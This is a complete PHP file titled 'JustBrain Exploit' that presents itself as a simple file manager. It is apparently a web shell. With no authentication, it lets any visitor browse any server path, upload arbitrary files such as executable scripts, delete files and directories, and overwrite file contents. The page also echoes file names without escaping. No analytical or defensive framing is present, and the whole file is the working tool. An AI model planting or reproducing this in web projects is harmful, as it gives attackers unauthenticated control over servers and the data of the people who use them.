<?php
// Simple PHP File Manager

// Path to manage
$path = isset($_GET['path']) ? $_GET['path'] : '.';

// Normalize and secure the path
$path = realpath($path);

// Helper function to get the size of a directory
function getDirectorySize($path) {
    $bytestotal = 0;
    if($path !== false && $path != '' && file_exists($path)){
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)) as $object){
            $bytestotal += $object->getSize();
        }
    }
    return $bytestotal;
}

// Handle file upload
if(isset($_FILES['file'])){
    $upload_path = $path . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)){
        echo "<script>alert('File uploaded successfully!');</script>";
    } else {
        echo "<script>alert('File upload failed!');</script>";
    }
}

// Handle file deletion
if(isset($_GET['delete'])){
    $delete_path = realpath($path . '/' . $_GET['delete']);
    if(is_file($delete_path)){
        unlink($delete_path);
        echo "<script>alert('File deleted successfully!');</script>";
    } elseif(is_dir($delete_path)){
        rmdir($delete_path);
        echo "<script>alert('Directory deleted successfully!');</script>";
    } else {
        echo "<script>alert('Deletion failed!');</script>";
    }
}

// Handle file editing
if(isset($_POST['save']) && isset($_POST['content']) && isset($_GET['edit'])){
    $edit_path = realpath($path . '/' . $_GET['edit']);
    file_put_contents($edit_path, $_POST['content']);
    echo "<script>alert('File saved successfully!');</script>";
}

// List files and directories
$files = scandir($path);
$path_parts = explode(DIRECTORY_SEPARATOR, $path);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>JustBrain Exploit</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; color: #333; margin: 0; padding: 20px; }
        .file-manager { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); position: relative; }
        .file-manager h1 { margin-top: 0; color: #007bff; }
        .path { margin: 10px 0; }
        .path a { color: #007bff; text-decoration: none; }
        .path a:hover { text-decoration: underline; }
        .watermark { position: absolute; bottom: 10px; right: 10px; font-size: 12px; color: #ccc; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f8f9fa; }
        td a { color: #007bff; text-decoration: none; }
        td a:hover { text-decoration: underline; }
        .editor { margin-top: 20px; }
        .editor textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .editor input[type="submit"] { margin-top: 10px; padding: 10px 20px; border: none; background-color: #007bff; color: #fff; cursor: pointer; border-radius: 4px; }
        .editor input[type="submit"]:hover { background-color: #0056b3; }
        .upload-form input[type="file"] { margin-right: 10px; }
        .upload-form input[type="submit"] { padding: 5px 15px; border: none; background-color: #28a745; color: #fff; cursor: pointer; border-radius: 4px; }
        .upload-form input[type="submit"]:hover { background-color: #218838; }
    </style>
</head>
<body>
<div class="file-manager">
    <h1>JustBrain File Manager</h1>

    <!-- Display Path -->
    <div class="path">
        <?php foreach($path_parts as $key => $part): ?>
            <?php $current_path = implode(DIRECTORY_SEPARATOR, array_slice($path_parts, 0, $key + 1)); ?>
            <a href="?path=<?php echo urlencode($current_path); ?>"><?php echo htmlspecialchars($part); ?></a>
            <?php if($key < count($path_parts) - 1): ?>
                &gt;
            <?php endif; ?>
        <?php endforeach; ?>
    </div>

    <!-- Upload Form -->
    <form action="" method="post" enctype="multipart/form-data" class="upload-form">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>

    <!-- Files Table -->
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Actions</th>
        </tr>
        <?php foreach($files as $file): ?>
            <?php if($file == '.' || $file == '..') continue; ?>
            <tr>
                <td>
                    <?php if(is_dir($path . '/' . $file)): ?>
                        <a href="?path=<?php echo urlencode($path . '/' . $file); ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                        <?php echo $file; ?>
                    <?php endif; ?>
                </td>
                <td><?php echo is_dir($path . '/' . $file) ? getDirectorySize($path . '/' . $file) . ' bytes' : filesize($path . '/' . $file) . ' bytes'; ?></td>
                <td>
                    <?php if(is_file($path . '/' . $file)): ?>
                        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Are you sure you want to delete this file?');">Delete</a>
                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($file); ?>">Edit</a>
                    <?php elseif(is_dir($path . '/' . $file)): ?>
                        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Are you sure you want to delete this directory?');">Delete</a>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <!-- File Editor -->
    <?php if(isset($_GET['edit']) && is_file($path . '/' . $_GET['edit'])): ?>
        <?php
            $edit_path = $path . '/' . $_GET['edit'];
            $content = file_get_contents($edit_path);
        ?>
        <div class="editor">
            <h2>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h2>
            <form action="" method="post">
                <textarea name="content" rows="20" cols="80"><?php echo htmlspecialchars($content); ?></textarea><br>
                <input type="submit" name="save" value="Save">
            </form>
        </div>
    <?php endif; ?>

    <!-- Watermark -->
    <div class="watermark">JustBrain Labs</div>
</div>
</body>
</html>